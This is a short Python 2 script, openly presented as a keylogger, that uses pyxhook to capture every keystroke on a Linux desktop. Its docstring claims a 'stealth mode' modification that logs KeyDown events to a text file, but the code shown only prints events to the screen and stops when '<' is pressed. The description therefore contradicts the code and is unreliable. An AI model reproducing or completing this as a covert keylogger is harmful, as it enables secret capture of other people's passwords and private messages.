"""
A simple example of hooking the keyboard on Linux using pyxhook

Any key pressed prints out the keys values, program terminates when "<" key is pressed.

This keylloger is originally created by Tim Alexander <dragonfyre13@gmail.com> but was modified by Slaveworx
to work in stealth mode and output the KeyDown events to a text file instead of just printing KeyUp and KeyDown events on screen.

SLAVEWORX 2015
"""

#Libraries we need
import pyxhook
import time


	

#This function is called every time a key is presssed
def kbevent( event ):
    #print key info
    print event
    
    #If the ascii value matches "<" key the script exits:
    if event.Ascii == 60:
        global running
        running = False
        



#Create hookmanager
hookman = pyxhook.HookManager()
#Define our callback to fire when a key is pressed down
hookman.KeyDown = kbevent
#Hook the keyboard
hookman.HookKeyboard()
#Start our listener
hookman.start()


#Create a loop to keep the application running
running = True

while running:
    time.sleep(0.1)

#Close the listener when we are done
hookman.cancel()
